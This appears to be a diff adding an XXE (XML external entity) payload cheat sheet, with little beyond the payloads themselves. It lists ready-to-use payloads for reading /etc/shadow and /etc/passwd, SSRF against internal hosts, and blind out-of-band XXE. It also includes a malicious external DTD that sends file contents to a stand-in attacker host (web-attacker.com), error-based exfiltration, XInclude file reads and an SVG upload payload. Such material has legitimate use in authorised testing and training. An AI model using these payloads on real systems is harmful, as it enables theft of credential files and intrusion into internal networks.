@@ -1,0 +1,79 @@
+testing for XXE:
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&example;</lastName>
+ </userInfo>
+---------------------------------------------------------------------------------------------------
+XXE: File Disclosure
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&ent;</lastName>
+</userInfo>
+-----------------------------------------------------------------------------------------------------
+XXE to perform SSRF attacks:
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&xxe;</lastName>
+</userInfo>
+------------------------------------------------------------------------------------------------------
+blind XXE using out-of-band (OAST):
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&xxe;</lastName>
+</userInfo>
+-------------------------------------------------------------------------------------------------------
+Blind XXE with out-of-band interaction via XML parameter entities:
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>1</lastName>
+</userInfo>
+--------------------------------------------------------------------------------------------------------
+blind XXE to exfiltrate data using a malicious external DTD:
+malicious DTD hosted on remote host:
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+XXE payload pointing to a attacker host:
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>1</lastName>
+</userInfo>
+--------------------------------------------------------------------------------------------------------
+blind XXE to retrieve data via error messages:
+malicious DTD hosted on remote host:
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+XXE payload pointing to a attacker host:
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>1</lastName>
+</userInfo>
+%error;
+------------------------------------------------------------------------------------------------------------
+XInclude to retrieve files(when you don't control the entire XML document or the attack surface is less visible):
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+for example:
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+--------------------------------------------------------------------------------------------------------------
+XXE via image file upload(svg or docs):
+uploading the file as .svg:
+ <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> 
